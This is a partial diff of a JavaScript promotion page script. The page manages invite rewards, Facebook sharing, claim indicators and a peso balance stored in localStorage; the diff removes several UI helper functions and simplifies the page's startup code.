-            var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(caption);
-            
-            window.open(fbShareUrl, '_blank', 'width=600,height=500');
-            
-            setHasSharedGlobal(true);
-            saveIndicatorStatus();
+            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(caption), '_blank', 'width=600,height=500');
         };
     }
 }
 
-// ========== DROPDOWN TOGGLE ==========
-function initDropdownToggle() {
-    var dropdownBtn = document.getElementById('dropdownBtn');
-    var dropdownContent = document.getElementById('dropdownContent');
-    
-    if (dropdownBtn && dropdownContent) {
-        var newBtn = dropdownBtn.cloneNode(true);
-        dropdownBtn.parentNode.replaceChild(newBtn, dropdownBtn);
-        dropdownBtn = newBtn;
-        
-        dropdownBtn.onclick = function(e) {
-            e.stopPropagation();
-            dropdownContent.classList.toggle('show');
-        };
-        
-        document.addEventListener('click', function(e) {
-            if (dropdownBtn && dropdownContent) {
-                if (!dropdownBtn.contains(e.target) && !dropdownContent.contains(e.target)) {
-                    dropdownContent.classList.remove('show');
-                }
-            }
-        });
-    }
-}
-
-// ========== INDICATOR SYSTEM ==========
-var indicatorLeftRewardClaimed = false;
-var indicatorHasInvited = false;
-var indicatorHasShared = false;
-var indicatorHasAcceptedInvite = false;
-
-function updateAllIndicators() {
-    var indicator1 = document.getElementById('indicator1');
-    var indicator2 = document.getElementById('indicator2');
-    var indicator3 = document.getElementById('indicator3');
-    
-    if (indicator1) {
-        indicator1.classList.remove('indicator-red-yellow', 'indicator-yellow-solid');
-        indicator1.style.animation = 'none';
-        
-        if (!indicatorLeftRewardClaimed) {
-            indicator1.classList.add('indicator-red-yellow');
-            indicator1.style.animation = 'pulseRedYellow 1s infinite';
-        } else {
-            indicator1.classList.add('indicator-yellow-solid');
-            indicator1.style.background = '#ffd700';
-            indicator1.style.boxShadow = '0 0 15px #ffd700';
-        }
-    }
-    
-    if (indicator2) {
-        indicator2.classList.remove('indicator-yellow-green', 'indicator-blue');
-        indicator2.style.animation = 'none';
-        
-        if (indicatorLeftRewardClaimed) {
-            if (indicatorHasInvited && !indicatorHasShared) {
-                indicator2.classList.add('indicator-yellow-green');
-                indicator2.style.animation = 'pulseYellowGreen 1s infinite';
-            } else if (!indicatorHasInvited && indicatorHasShared) {
-                indicator2.classList.add('indicator-blue');
-                indicator2.style.animation = 'pulseBlue 1s infinite';
-            } else if (indicatorHasInvited && indicatorHasShared) {
-                indicator2.classList.add('indicator-yellow-green');
-                indicator2.style.animation = 'pulseAlternate 1s infinite';
-            }
-        }
-    }
-    
-    if (indicator3) {
-        indicator3.classList.remove('indicator-green-solid');
-        indicator3.style.animation = 'none';
-        
-        if (indicatorHasAcceptedInvite) {
-            indicator3.classList.add('indicator-green-solid');
-            indicator3.style.background = '#39ff14';
-            indicator3.style.boxShadow = '0 0 15px #39ff14';
-        }
-    }
-}
-
-function setLeftRewardClaimedGlobal(claimed) {
-    indicatorLeftRewardClaimed = claimed;
-    updateAllIndicators();
-}
-
-function setHasInvitedGlobal(invited) {
-    indicatorHasInvited = invited;
-    updateAllIndicators();
-}
-
-function setHasSharedGlobal(shared) {
-    indicatorHasShared = shared;
-    updateAllIndicators();
-}
-
-function setHasAcceptedInviteGlobal(accepted) {
-    indicatorHasAcceptedInvite = accepted;
-    if (accepted) {
-        indicatorHasInvited = true;
-    }
-    updateAllIndicators();
-}
-
-function loadIndicatorStatus() {
-    var phone = localStorage.getItem("userPhone");
-    if (!phone) return;
-    
-    indicatorLeftRewardClaimed = localStorage.getItem("leftReward_" + phone) === 'true';
-    indicatorHasInvited = localStorage.getItem("hasInvited_" + phone) === 'true';
-    indicatorHasShared = localStorage.getItem("hasShared_" + phone) === 'true';
-    indicatorHasAcceptedInvite = localStorage.getItem("hasAcceptedInvite_" + phone) === 'true';
-    
-    updateAllIndicators();
-}
-
-function saveIndicatorStatus() {
-    var phone = localStorage.getItem("userPhone");
-    if (!phone) return;
-    
-    localStorage.setItem("hasInvited_" + phone, indicatorHasInvited);
-    localStorage.setItem("hasShared_" + phone, indicatorHasShared);
-    localStorage.setItem("hasAcceptedInvite_" + phone, indicatorHasAcceptedInvite);
-}
-
-// ========== CHECK FOR ACCEPTED INVITES ==========
-function checkAcceptedInvites() {
-    var invitations = getInvitations();
-    var hasAccepted = false;
-    
-    for (var i = 0; i < invitations.length; i++) {
-        if (invitations[i].status === 'approved') {
-            hasAccepted = true;
-            break;
-        }
-    }
-    
-    if (hasAccepted) {
-        setHasAcceptedInviteGlobal(true);
-        saveIndicatorStatus();
-    }
-}
-
-// ========== VIDEO AUTOPLAY ==========
-function initVideoAutoplay() {
-    var video = document.querySelector('.lucky-cat-video video');
-    if (video) {
-        video.play().catch(function(e) {
-            console.log("Autoplay blocked:", e);
-        });
-    }
-}
-
-// ========== ENTER KEY SUPPORT ==========
-function initEnterKeySupport() {
-    var friendInput = document.getElementById('friendPhoneInput');
-    var sendButton = document.getElementById('sendInviteBtn');
-    
-    if (friendInput && sendButton) {
-        friendInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                sendButton.click();
-            }
-        });
-    }
-}
-
-// ========== STATS DISPLAY ==========
-function initStatsDisplay() {
-    var balanceSpan = document.getElementById('userBalanceDisplay');
-    var invitesSpan = document.getElementById('invitesCountDisplay');
-    
-    if (balanceSpan) {
-        balanceSpan.innerHTML = '₱' + getBalance();
-    }
-    
-    if (invitesSpan) {
-        invitesSpan.innerHTML = getInvitesCount() + ' / 6';
+// ========== UPDATE LEFT CARD VISUAL ==========
+function updateLeftCardFromStorage() {
+    var leftCard = document.getElementById('leftCard');
+    if (!leftCard) return;
+    if (getLeftRewardClaimed()) {
+        leftCard.classList.add('prize-card-claimed');
+        leftCard.classList.remove('prize-card-glow');
+    } else {
+        leftCard.classList.add('prize-card-glow');
+        leftCard.classList.remove('prize-card-claimed');
     }
 }
 
@@ -954,7 +553,6 @@ document.addEventListener('DOMContentLoaded', function() {
     console.log("Promotion.js loading...");
     
     var userPhone = localStorage.getItem("userPhone");
-    
     if (!userPhone) {
         alert("Please login first.");
         window.location.href = "index.html";
@@ -963,28 +561,18 @@ document.addEventListener('DOMContentLoaded', function() {
     
     var display = document.getElementById('userPhoneDisplay');
     if (display) {
-        if (userPhone.length === 11) {
-            display.innerText = userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11);
-        } else {
-            display.innerText = userPhone;
-        }
+        display.innerText = userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11);
     }
     
-    initStatsDisplay();
+    displayBalance();
+    displayInvitesCount();
     updateLeftCardFromStorage();
     renderInvitationsFromStorage();
     
-    loadIndicatorStatus();
-    checkAcceptedInvites();
-    
     initLeftLuckyCard();
-    initRightLuckyCard();
     initClaimNowButton();
     initClaimButton();
     initFacebookShare();
-    initDropdownToggle();
-    initVideoAutoplay();
-    initEnterKeySupport();
     
     var sendBtn = document.getElementById('sendInviteBtn');
     if (sendBtn) {
@@ -994,7 +582,4 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     console.log("Promotion.js ready");
-    console.log("Current balance:", getBalance());
-    console.log("Left reward claimed:", getLeftRewardClaimed());
-    console.log("Invites count:", getInvitesCount());
 });
